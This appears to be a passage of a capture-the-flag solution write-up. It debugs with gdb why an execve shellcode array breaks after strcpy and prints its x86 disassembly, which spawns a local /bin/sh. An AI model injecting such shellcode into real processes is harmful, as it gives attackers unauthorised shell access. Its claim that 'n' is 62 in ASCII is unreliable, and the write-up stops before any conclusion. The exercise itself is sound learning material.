# Solution

1. First let's check what happens when we make no changes at all to the string, this is done by changing an index to the same thing stored at that index.
for example: sc\[12\] will be set to 'n' which is 62 in ascii.



gdb-peda$ x/11i $ebp-0x1c
   0xffffd4cc:	xor    eax,eax
   0xffffd4ce:	push   eax
   0xffffd4cf:	push   0x68732f2f
   0xffffd4d4:	push   0x69622f
   0xffffd4d9:	test   esp,ebx
   0xffffd4db:	test   DWORD PTR [edi],0x5e080486
   0xffffd4e1:	xchg   DWORD PTR [eax+ecx*1],eax
   0xffffd4e4:	clc
   0xffffd4e5:	aam    0xff
   0xffffd4e7:	dec    DWORD PTR [eax]
   0xffffd4e9:	aad    0xff
gdb-peda$ x/11i 0x804a02c
   0x804a02c <sc>:	xor    eax,eax
   0x804a02e <sc+2>:	push   eax
   0x804a02f <sc+3>:	push   0x68732f2f
   0x804a034 <sc+8>:	push   0x69622f
   0x804a039 <sc+13>:	mov    ebx,esp
   0x804a03b <sc+15>:	push   eax
   0x804a03c <sc+16>:	push   ebx
   0x804a03d <sc+17>:	mov    ecx,esp
   0x804a03f <sc+19>:	mov    al,0xb
   0x804a041 <sc+21>:	int    0x80
   0x804a043 <sc+23>:	add    BYTE PTR [eax],al
gdb-peda$



The shellcode at sc+13 is changed, which leads me to think strcpy malfunctioned at this point.

This is the point where the string is cut, and C is supposed to append the second string. I have tested this and it works. Let's try to modify the string at a different index, and see if us modifying it is what caused it.



The shellcode:


   0x804a02c <sc>:	xor    eax,eax
   0x804a02e <sc+2>:	push   eax
   0x804a02f <sc+3>:	push   0x68732f2f
   0x804a034 <sc+8>:	push   0x69622f
   0x804a039 <sc+13>:	mov    ebx,esp
   0x804a03b <sc+15>:	push   eax
   0x804a03c <sc+16>:	push   ebx
   0x804a03d <sc+17>:	mov    ecx,esp
   0x804a03f <sc+19>:	mov    al,0xb
   0x804a041 <sc+21>:	int    0x80
   0x804a043 <sc+23>:	add    BYTE PTR [eax],al
